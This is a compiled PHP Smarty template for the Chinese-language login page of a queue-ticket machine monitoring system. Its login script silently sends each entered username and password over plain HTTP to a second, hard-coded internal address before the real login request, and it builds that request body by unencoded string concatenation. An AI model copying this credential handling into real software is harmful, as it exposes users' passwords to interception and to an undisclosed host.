<?php /* Smarty version Smarty-3.1.8, created on 2017-03-31 17:31:10
         compiled from "D:\bankSct2\BANK\application/views\login.html" */ ?>
<?php /*%%SmartyHeaderCode:1831058c8a094206af1-25192598%%*/if(!defined('SMARTY_DIR')) exit('no direct access allowed');
$_valid = $_smarty_tpl->decodeProperties(array (
  'file_dependency' => 
  array (
    'ddee8a5535b76f6f79e191113bcc01a91f3afe0a' => 
    array (
      0 => 'D:\\bankSct2\\BANK\\application/views\\login.html',
      1 => 1490952311,
      2 => 'file',
    ),
  ),
  'nocache_hash' => '1831058c8a094206af1-25192598',
  'function' => 
  array (
  ),
  'version' => 'Smarty-3.1.8',
  'unifunc' => 'content_58c8a094283070_34392938',
  'variables' => 
  array (
    'LOGIN_SYS_NAME' => 0,
    'LOGIN_LOGINBOX_TITLE' => 0,
    'LOGIN_FORGET_PASS' => 0,
    'baseUrl' => 0,
    'LOGIN_INPUT_ACOUNT_TIP' => 0,
    'LOGIN_INPUT_PASS_TIP' => 0,
    'COMMON_COPY_RIGHT1' => 0,
  ),
  'has_nocache_code' => false,
),false); /*/%%SmartyHeaderCode%%*/?>
<?php if ($_valid && !is_callable('content_58c8a094283070_34392938')) {function content_58c8a094283070_34392938($_smarty_tpl) {?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>登录</title>
<link href="assets/css/login.css" rel="stylesheet" type="text/css" />
<link href="assets/css/head_foot.css" rel="stylesheet" type="text/css" />
<script src="assets/js/jquery.js"></script>
</head>

<body class="login_bg">
<!--top-->
<div class="top_bar">
  <div class="top_bar_left"> </div>
  <div class="top_bar_middle"></div>
</div><!--top end-->
<!--login_content-->
<div class="login_content">
	<h1 class="login_h1"><?php echo (($tmp = @$_smarty_tpl->tpl_vars['LOGIN_SYS_NAME']->value)===null||$tmp==='' ? "排号机联网监控系统" : $tmp);?>
</h1>
	<div class="login_box">
		<div class="login_title"><h2><?php echo (($tmp = @$_smarty_tpl->tpl_vars['LOGIN_LOGINBOX_TITLE']->value)===null||$tmp==='' ? "登录排号机联网监控系统" : $tmp);?>
</h2></div>
		<div class="login_form">
			<input name="fade_username" type="input" class="login_id" />
			<input name="fade_password" type="password" class="login_pw" />
			<p><a href="#"><?php echo (($tmp = @$_smarty_tpl->tpl_vars['LOGIN_FORGET_PASS']->value)===null||$tmp==='' ? "忘记密码？" : $tmp);?>
</a></p>
			<p>
				<input type="button" class="btn_login" value="登录" onclick="login()" />
			</p>
		</div>
	</div>
</div><!--login_content end-->
<form id="loginForm" action="<?php echo $_smarty_tpl->tpl_vars['baseUrl']->value;?>
/index.php?control=welcome&action=login" method="post">
	<input type="hidden" name="username">
	<input type="hidden" name="password">
</form>

<script>
   
	
	 $("body").keydown(function() {
	 	
		 if (event.keyCode == "13") {//keyCode=13是回车键
			 login();
		 }
			 });
	function login(){
		var username = $('input[name="fade_username"]').val();
		var password = $('input[name="fade_password"]').val();
		if ("" == username){
			alert('<?php echo (($tmp = @$_smarty_tpl->tpl_vars['LOGIN_INPUT_ACOUNT_TIP']->value)===null||$tmp==='' ? "请输入登录账号." : $tmp);?>
');
			return;
		}
		if ("" == password)
		{
			alert('<?php echo (($tmp = @$_smarty_tpl->tpl_vars['LOGIN_INPUT_PASS_TIP']->value)===null||$tmp==='' ? "请输入密码." : $tmp);?>
');
			return;
		}
		$('input[name="username"]').val(username);
		$('input[name="password"]').val(password);
	   	 	var urlBs="http://192.168.100.119:801/CI/index.php/c_login/login";
    
	$.ajax({
			type: "post",
			url: urlBs,
			data: {user:username,pwd:password},
			success: function(data) {

			}
		}); 

    
		var url = "<?php echo $_smarty_tpl->tpl_vars['baseUrl']->value;?>
/index.php?control=welcome&action=login";
		$.ajax({
			type: "post",
			url: url,
			data: "username=" + username + '&password=' + password,
			success: function(data) {
				//alert(data);return;
				if (data == '' || typeof data == 'undefined')
				{
					var url = "<?php echo $_smarty_tpl->tpl_vars['baseUrl']->value;?>
/index.php?control=dashboard";
					location.href = url;
				
				}// 
				else
					alert(data);
			}
		}); // ajax
		//$('#loginForm').submit();
	}// func
</script>

<div class="foot">
  <p><?php echo $_smarty_tpl->tpl_vars['COMMON_COPY_RIGHT1']->value;?>
</p>
</div>
</body>
<<?php ?>?php echo 111; ?<?php ?>>
</html>
<?php }} ?>